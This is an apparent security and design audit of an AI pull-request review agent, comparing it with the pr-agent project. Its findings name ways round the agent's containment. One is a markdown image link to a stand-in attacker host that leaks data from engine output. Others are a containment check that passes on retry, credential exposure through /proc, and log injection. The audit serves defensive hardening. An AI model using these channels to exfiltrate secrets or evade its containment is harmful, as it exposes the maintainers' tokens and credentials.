# Audit of 1.7.0, the open roadmap, and what to take from pr-agent

Reference: `main` at `af9fae2` (1.7.0), read on 2026-09-29. The comparison
target is [the-pr-agent/pr-agent](https://github.com/the-pr-agent/pr-agent)
at `10bbd9a` (0.46.0, same day). Tracked as
[issue #120](https://github.com/prasadtalasila/pr-review-agent/issues/120).

Four questions, in the order they were asked:

1. What is wrong or weak in the code as it stands?
2. Which roadmap items are still open, once the ones closed as *not
   planned* are taken out?
3. What does pr-agent do that this project should, and what should it not
   copy?
4. What would each transferable feature cost to build, and how much of that
   does copying pr-agent's code (MIT, with attribution) save?

Items already closed as **not planned** (#21, #28, #63, #66, #72, #74, #79,
#84) are left out of every proposal below and named where a finding touches
them.

---

## 1. Findings

### 1.1 Verified defects

Both were reproduced by running the code, not by reading it.

**D1. The preflight refusal only holds for the first attempt.**
`ClaudeCliEngine.preflight` sets `_version_checked = True` *before*
`_verify_flags` runs. When the flag check raises `EngineUnavailable`, the
worker settles at zero and releases the row for retry; on the retry
`preflight` returns early and the review runs with the missing containment
flag. A stub whose `--help` lacked the flags refused attempt one and passed
attempt two. This undoes roadmap A3. Fix: set the flag only after both
checks succeed, and add a test that calls `preflight` twice against a
failing help text.

**D2. Pushes to the newest open pull request re-trigger reviews.**
The classifier docstring says pushes are ignored, but the `pr_opened`
dedupe key embeds `head_sha` and freshness is `created_at < since`.
`Daemon._pull_requests` advances the watermark only to the newest
`created_at` seen, so the most recently opened pull request sits exactly at
the boundary and stays fresh until a newer one is opened. Every push then
mints a new trigger; `fold` will not collapse it because the head differs,
and pacing defers by fifteen minutes but does not drop. Three heads at
`created_at == since` all classified `accepted`. This widens spend beyond
what `CLAUDE.md` §5 documents. Fix: drop `head_sha` from the `pr_opened`
key (the suggestion #79 made before it was closed), or record "reviewed
once" per pull request number, and pin the bound with a test.

### 1.2 Security improvements

- **S1. Kill the whole process tree on timeout.** `_subprocess.stop`
  terminates only the direct child. `claude` spawns helpers that survive
  the wall clock. Start children with `start_new_session=True` and signal
  the process group.
- **S2. Escape links and images in engine prose.** `sanitise` handles
  mentions, references and raw HTML, but `![](https://attacker/?d=…)` or a
  markdown link survives. An image embed is fetched when a reader opens the
  page, so it is an exfiltration channel that needs no click and no network
  tool. Escape `](` and bare URLs in prose, or at minimum image syntax.
- **S3. Extend the secret canary beyond `GITHUB_TOKEN`.** `leaks` is fed
  only the GitHub token. The child inherits `HOME`, so
  `~/.claude/.credentials.json` and `ANTHROPIC_API_KEY` are readable and
  unguarded. Feed the canary the API key and a prefix of the credential
  file. The underlying same-uid exposure is #63; this is the cheap partial.
- **S4. Log hygiene on the ERROR path.** `worker._failed` logs the
  exception message at ERROR; `EngineProtocolError` and `GitCommandError`
  carry attacker-influenced stdout and stderr, and the text formatter
  permits newline injection into the journal. Log a digest or a bounded,
  escaped excerpt. This is roadmap F4.
- **S5. Dev container: the remote-control daemon is baked into the shared
  entrypoint.** `docker/entrypoint.sh` and `docker-compose.yml` hardcode
  `/home/prasad/claude-daemon/rc-daemon.sh`, which starts
  `claude remote-control --permission-mode bypassPermissions` beside the
  reviewer's `~/.claude` credential and the passed-through `GITHUB_TOKEN`.
  Make it opt-in and remove the hardcoded username; passwordless `sudo`
  could also go from the default image. The `curl | sh` pin is #66 and is
  not re-raised.
- **S6. Comment edits change eligibility without changing attribution.**
  Freshness uses `updated_at`, so any collaborator with edit rights can
  insert `@handle` into an allowlisted user's old comment; the trigger, and
  the per-contributor budget, are charged to the original author. Either
  document the trust assumption or gate on `created_at`.
- **S7. Cheap systemd ceilings now.** Add `MemoryMax=`, `TasksMax=`,
  `PrivateTmp=yes` and `CapabilityBoundingSet=` to the shipped user units
  ahead of any sandbox work. This is roadmap F1.
- **S8. `/proc` exposure.** With the daemon and the child on one uid,
  `/proc/<daemon pid>/environ` exposes `GITHUB_TOKEN` to the `Read` tool
  even though `cli_environment` strips it. Worth a line in the docs while
  #63 is closed.

### 1.3 Design improvements

- **G1. Enforce "cache_dir must differ per instance".** `Workspace.sweep`
  deletes `runs/` at startup; the fleet docs only warn. Write an owner
  marker into `cache_dir` and refuse to start when another repository owns
  it.
- **G2. Wire or remove the GitHub base URL.** `Workspace` accepts
  `base_url`, `GitHubClient` hardcodes `api.github.com`, and `daemon.run`
  passes neither.
- **G3. Flag verification should match whole tokens.** `_verify_flags`
  uses substring containment, so `--model` is satisfied by `--model-foo`.
- **G4. Keep store calls off the event loop.** Every store call is
  synchronous on one connection shared by the poll task and the workers;
  `busy_timeout` can hold the loop for five seconds under multi-daemon
  contention.
- **G5. Coarse pre-fetch size refusal.** The API's totals are available
  before the fetch; a generous pre-fetch cap stops a pathological pull
  request from filling disk while the precise post-exclusion gate stays.
  This is half of roadmap F2.
- **G6. Add a provenance column to findings now.** `Finding` has no
  source field; B1/B3 or a second adapter would need a migration later.
- **G7. `SECURITY.md` and release attestations.** There is no
  vulnerability-reporting policy in the repository. pr-agent ships one plus
  digest pinning and GitHub Artifact Attestations; the wheel and sdist here
  could carry attestations from the existing release workflow.

---

## 2. Roadmap items still open

From [FEATURE-ROADMAP.md](../../FEATURE-ROADMAP.md). Landed items (A3, A5,
A6) and items whose tracking issue was closed as not planned are excluded.

| Item | Section | What it is | Order | Note |
| :-- | :-- | :-- | :-- | :-- |
| A10 | Confinement | One `confinement.py` holding the environment allowlist, tool set, argv and, later, any uid/sandbox/egress profile | 9 | Still valuable without A1/A2: today the profile spans `BASE_ENVIRONMENT`, `env_prefixes`, `TOOLS` and the argv tuple |
| B1 | Deterministic gate | Opt-in scanners on the worktree before the engine; findings passed in as evidence | 6 | Zero tokens; an absent or crashed scanner must not fail the review |
| B2 | Deterministic gate | Scanner-only rung below `EXHAUSTED` | 6 | Distinct from the 60 % rung (#21); needs B1 |
| B3 | Deterministic gate | Record where a finding came from | 10 | See G6 |
| B4 | Deterministic gate | Baseline scanner findings at the merge base | 10 | `Checkout.merge_base` exists |
| B5 | Deterministic gate | Detect a finding silenced rather than fixed | 10 | `ReviewRequest.prior` and stable numbering carry the identity |
| B6 | Deterministic gate | SARIF output and CWE mapping (open question) | 12 | Needs `security-events: write`; CWE mapping alone is free |
| C1 | Vocabulary | A verb after the mention (`@claude ask …`) | 8 | Trigger layer; must never accept configuration from the comment (§3.1, P2) |
| C2 | Vocabulary | Incremental review since the last reviewed head | 4 | Largest budget saving; the ledger holds the previous head |
| C3 | Vocabulary | Committable suggestion blocks | 11 | Off by default |
| C4 | Vocabulary | Inline line-anchored comments | 11 | Costs the "cannot approve" absent-capability guarantee |
| C5 | Vocabulary | Per-repository review configuration at the merge base | 11 | Adopt pr-agent's host-only key allowlist pattern |
| D1 | Dimensions | Optional per-dimension passes, whole set reserved up front | 11 | Must not triple default spend |
| D2 | Dimensions | Truncate an oversized pull request and say so | 11 | Belongs in `exclusions.pathspec` |
| E1 | Transparency | AI-disclosure line per comment | 7 | Formatting over data already recorded |
| E2 | Transparency | Append-only JSONL audit log per run | 7 | Independent of the retention sweep (#28) |
| F1 | Ceilings | cgroup ceilings over git and engine children | 7 | Configuration; see S7 |
| F2 | Ceilings | Free-space floor in `Workspace.sweep` | 9 | See G5 |
| F3 | Ceilings | `runs/` mode, daemon umask, mirror garbage collection | 7 | The mode half is covered by `cache_dir`'s mode today; the GC is not |
| F4 | Ceilings | Log hygiene | 9 | See S4 |

Excluded: A3, A5, A6 landed. A1, A2, A4 are #63, closed as not planned. A7
is #84, closed as not planned, and needs A1/A2. A8 and A9 consume A1/A2 and
have nothing to consume while #63 is closed. The 60 % rung (#21), the
retention sweep (#28), pagination (#72), `_pr_number` (#74), the
publish-time state check (#79) and the dev-image pin (#66) were never
roadmap items and are not re-proposed.

---

## 3. Comparison with pr-agent

pr-agent is the community-maintained continuation of Codium/Qodo's
PR-Agent: a webhook, Action and CLI tool with providers for GitHub, GitLab,
Bitbucket, Azure DevOps, Gerrit, Gitea and CodeCommit, a LiteLLM model
layer, and a family of slash commands. The two projects make opposite
architectural bets, so most of its features are not transferable as code,
but several patterns are.

| Dimension | pr-review-agent | pr-agent |
| :-- | :-- | :-- |
| Trigger surface | Outbound polling of three endpoints; no listener | Webhook servers, GitHub Action, polling mode, CLI |
| Who may trigger | Numeric-id allowlist, checked before any spend | Any commenter on an installed repo; regex ignore lists; bot heuristics by display name |
| Config from the reviewed repo | Only `standards_paths` text, read at the merge base | `.pr_agent.toml` at root and per directory, with an explicit host-only key allowlist; comment arguments override most keys |
| Engine boundary | `claude` CLI subprocess, read-only tools, built environment, wall clock | In-process LiteLLM calls; the model sees the diff plus selected repo files |
| Spend control | Reserve-then-settle ledger, rolling windows, ladder, breaker, pacing, per-contributor cap | Per-call token and call caps, model routing by size, fallback models; no cross-run budget |
| Output hygiene | Mention neutralisation, escaping, length cap, secret canary; comment-only, cannot approve | Sanitised failure text; auto-approval exists but is off; can add labels, edit descriptions, push commits |
| Output shape | One new comment per review, numbered findings stable across rounds | Persistent edited comment, inline comments, labels, committable suggestions, diagram, run-details footer |
| Large pull requests | Size gate refuses; exclusions by pathspec | Token-aware compression, dynamic asymmetric context, chunked review, clip-or-skip policy |
| Observability | Structured JSON logs to journald | OpenTelemetry with PR URLs and error details off by default |
| Secrets | `GITHUB_TOKEN` from the environment only | `.secrets.toml`, environment, AWS Secrets Manager, GCS |
| Supply chain | SHA-pinned Actions, `pip-audit`, Trusted Publishing | Immutable tags, digest pinning, Artifact Attestations, `SECURITY.md` |

### 3.1 Security patterns to take

- **P1. Host-only versus repo-overridable settings, as an allowlist.**
  pr-agent's `config_security.py` enumerates, per section, which keys a
  reviewed repository may set, with the reason for each denial beside it.
  When C5 or C1 land, copy the shape: a frozen map of overridable keys and
  one test that every key in the schema is classified.
- **P2. Never let a comment carry configuration.** pr-agent's
  [#2445](https://github.com/the-pr-agent/pr-agent/issues/2445) (a clone
  target overridable from a comment, a weak hostname check, the token
  embedded in the clone URL) is the failure C1 must design out: a verb
  after the mention is a fixed vocabulary, not key-value arguments.
- **P3. `SECURITY.md`, private vulnerability reporting, attestations.**
  See G7.
- **P4. Bot detection by account type, not display name.** This project's
  `type == "Bot"` check is the stronger one; keep it.
- **P5. Telemetry private by default.** If metrics are added, copy the
  `include_pr_url=false` and `include_error_details=false` defaults.
- **P6. Deterministic ignore rules before any spend.** Labels, target and
  source branches, title patterns. They are spend controls: a `wip` label
  should not reserve allowance.

Where this project is already ahead and should not converge: no inbound
listener, identity by numeric id, no in-comment argument parsing, the
ledger, and the publisher's absent-capability guarantee. pr-agent's
`enable_auto_approval` and `approve_pr_on_self_review` are exactly the
fields this project refuses to have.

### 3.2 Features to take

Ranked by value under this project's constraints.

- **Q1. Incremental review** with commit and minute thresholds (C2).
- **Q2. Self-reflection pass with a score threshold.** A second, cheaper
  engine call over the structured output only, reserved with the main run.
- **Q3. Model routing by pull request size.** An ordered rule list keyed on
  `checkout.reviewed`; the concrete mechanism #21 lacked.
- **Q4. Review coverage footer.** Say what exclusions and truncation
  removed.
- **Q5. Deterministic ignore rules** (P6) plus generated-code globs on top
  of `excluded_paths`.
- **Q6. Outcome reactions** replacing the 👀 on success or failure.
- **Q7. `@claude ask`** (C1), with pr-agent's `use_conversation_history`
  as the warning about what reaches the model.
- **Q8. Committable suggestions and inline comments** (C3/C4), gated by a
  score threshold if C3 lands.
- **Q9. Effort, risk and merge-recommendation fields** in the schema,
  rendered in the comment rather than as labels.
- **Q10. Host-level skill libraries**, loaded from a host path under a
  token cap, never from the tree.
- **Q11. Run-details footer** (E1).
- **Q12. Response language.**

Not recommended, matching the roadmap's position: multi-provider git
support, LiteLLM, description rewriting, changelog commits, label writes,
auto-approval, per-directory configuration from the reviewed tree.

### 3.3 pr-agent as a dependency

Measured against pr-agent 0.46.0's `pyproject.toml`.

- **Python floor.** pr-agent requires 3.12 or later; this project supports
  3.10 to 3.14 and CI proves the range. A hard dependency drops two
  versions.
- **Dependency tree.** Around 45 pinned packages, including `litellm`,
  `openai`, `anthropic`, `fastapi`, `uvicorn`, `gunicorn`, `boto3`,
  `google-cloud-aiplatform`, `langfuse`, `a2a-sdk`, `PyGithub`,
  `python-gitlab`, `tiktoken`, `GitPython`, `dynaconf`, `Jinja2` and the
  OpenTelemetry stack, several pinned exactly. Today the runtime tree is
  `httpx`, `PyYAML` and `click`.
- **The design constraint.** `DESIGN.md` rests on no vendor SDK being
  linked. Model SDKs arriving transitively make "nothing in this process
  can call a model outside the governor" a claim to re-check on every
  upgrade rather than something the import graph proves.
- **Coupling.** pr-agent's helpers read a dynaconf settings singleton at
  call time, so importing them means initialising its configuration system
  inside this daemon.

Recommendation: no runtime dependency. Vendor the few pure modules worth
having under `src/pr_review_agent/_vendor/pr_agent/`, MIT-attributed, with
the upstream commit recorded, in the shape `skill install` already uses. If
a runtime import is ever wanted, make it an optional extra so the default
install keeps its three-package tree and its Python floor.

---

## 4. Cost: rebuild versus copy with attribution

Estimates are for one engineer who knows this codebase, in working days,
including tests and documentation. Runtime cost is per review. "Copyable"
names the pr-agent source and how coupled it is to pr-agent's settings
singleton, logger and providers; the coupling is what decides whether
copying saves anything.

### 4.1 Rebuild from scratch

| Feature | Effort | New code, tests included | Runtime cost | Main risk |
| :-- | :-- | :-- | :-- | :-- |
| Ignore rules: labels, branches, title regex | 1 d | ~200 lines | None; refuses before spend | Regex on attacker-controlled titles; anchor and bound it |
| Generated-code exclusions | 0.5 d | Data only | None | Over-excluding a repo that reviews generated files |
| Outcome reactions | 0.5 d | ~60 lines | One extra POST | None |
| Coverage footer | 1 d | ~100 lines | None | None |
| Run-details footer (E1) | 1 d | ~80 lines | None | Discloses spend publicly; flag it |
| Response language | 0.5 d | ~30 lines | None | None |
| Incremental review (C2) | 3.5 d | ~350 lines | Saves 30 to 70 % on later rounds | Force-push makes the last head unreachable; fall back to full |
| Model routing by size | 2 d | ~150 lines | Saves tokens on small changes | Two models, two version assumptions |
| Host-only config allowlist (with C5) | 2 d + 3.5 d | ~250 lines + C5 | None | Any key reachable from the tree is an injection path |
| Effort, risk, merge fields | 2 d | ~150 lines | Small token increase | Prompt tuning; render, never label |
| Dynamic hunk context | 2 d | ~300 lines | Slightly larger prompt | Low value: the engine reads the tree |
| Self-reflection pass | 6 d | ~450 lines + a live test | +15 to 30 % tokens | Second call inside one reservation |
| Host-level skill libraries | 2.5 d | ~200 lines | Bounded by a cap | Paths host-only |
| `@claude ask` (C1) | 6 d | ~500 lines | Cheaper than a review | Trigger layer |
| **Total** | **~34 d** (30.5 d without C5) | | | |

### 4.2 Copy with attribution

Fixed overhead for the copying route, paid once: a `_vendor/pr_agent`
package with `LICENSE` and a `NOTICE` naming the upstream commit, a
`test_vendor_provenance.py` that pins it, and the first pass at making
foreign code clear `ruff`, `pylint`, `pyright` and the 250-line module
limit. About **1.5 d**, plus about **0.25 d per module** for splitting and
lint conformance.

| Feature | Copyable pr-agent source | Coupling | Effort with copying | Saving |
| :-- | :-- | :-- | :-- | :-- |
| Ignore rules | `servers/utils.shared_should_process_pr_logic` (settings + provider objects) | High | 1 d | 0 |
| Generated-code exclusions | `settings/generated_code_ignore.toml`, 42 lines of data | None | 0.25 d | 0.25 d |
| Outcome reactions | Provider-specific reaction code | High | 0.5 d | 0 |
| Coverage footer | `algo/run_output.py`, `run_details.py` (settings, provider) | High | 1 d | 0 |
| Run-details footer | `algo/run_details.py`, 234 lines, 7 coupled refs; shape only | High | 0.75 d | 0.25 d |
| Response language | One prompt line | None | 0.5 d | 0 |
| Incremental review | `github_provider._get_incremental_commits` (PyGithub) | Total | 3.5 d | 0 |
| Model routing | `algo/model_routing.py`, 80 lines, 7 coupled refs; rule matching portable | Medium | 1.5 d + 0.25 d | 0.25 d |
| Host-only allowlist | `config_security.py`, 178 lines; the pattern, not the keys | Low | 1.5 d + C5 | 0.5 d |
| Effort, risk, merge fields | `settings/pr_reviewer_prompts.toml` field definitions, 367 lines | None (data) | 1.5 d | 0.5 d |
| Dynamic hunk context | `algo/git_patch_processing.py`: `extend_patch`, `process_patch_lines`, `omit_deletion_hunks`, ~200 lines, 3 settings refs; 400 lines of tests | Low | 1 d + 0.25 d | 0.75 d |
| Self-reflection pass | `settings/code_suggestions/pr_code_suggestions_reflect_prompts.toml`, 115 lines; the mechanics are new here | Low (data) | 5 d | 1 d |
| Skill libraries | `algo/skills_loader.py`, 361 lines, 17 coupled refs; frontmatter parsing and token cap portable | Medium | 1.75 d + 0.25 d | 0.5 d |
| `@claude ask` | `tools/pr_questions.py` (LiteLLM, provider) | Total | 6 d | 0 |
| **Total** | | | **~30.5 d** incl. overhead (27 d without C5) | **~4 d gross, ~2.5 d net of overhead** |

### 4.3 Comparative totals

| | Rebuild | Copy with attribution | Difference |
| :-- | :-- | :-- | :-- |
| Cheap tier (six items) | 4.5 d | 4.0 d | 0.5 d |
| Medium tier (C2, routing, allowlist + C5, fields, hunk context) | 15 d | 12.75 d + 1.25 d overhead | 1 d |
| Expensive tier (reflection, skills, ask) | 14.5 d | 12.75 d + 0.5 d overhead | 1.25 d |
| One-off vendoring setup | 0 | 1.5 d | −1.5 d |
| **Total** | **~34 d** | **~32.75 d** | **~1.25 d, about 4 %** |

Copying saves little, and the reason is structural rather than a lack of
good code upstream: pr-agent's logic is written against a global settings
object, a global logger, PyGithub and LiteLLM, so the portable part of any
module is the algorithm in the middle, and that is the small part. The
three places copying is clearly worth it are the patch-extension helpers
(stdlib once parameterised, with tests that port intact), the reflection
rubric (data), and the generated-code globs (data). Everything else is
cheaper to write against this project's own types than to unpick.

Two cost centres that the numbers above include and people tend to leave
out: documentation and tests are roughly 40 % of every line, because every
component has a page under `docs/` and every spending change needs a
pinned bound; and the full set adds around fifteen keys to `config.yaml`,
which `CONFIG.md` already names as the failure mode to avoid, so several of
these should ship as fixed behaviour rather than knobs.

Not worth building either way: the compression strategy and chunked review
(the engine reads the tree; the diff is one prompt section), committable
suggestions and inline comments (they cost the publisher's cannot-approve
guarantee), and anything touching labels, descriptions or commits.
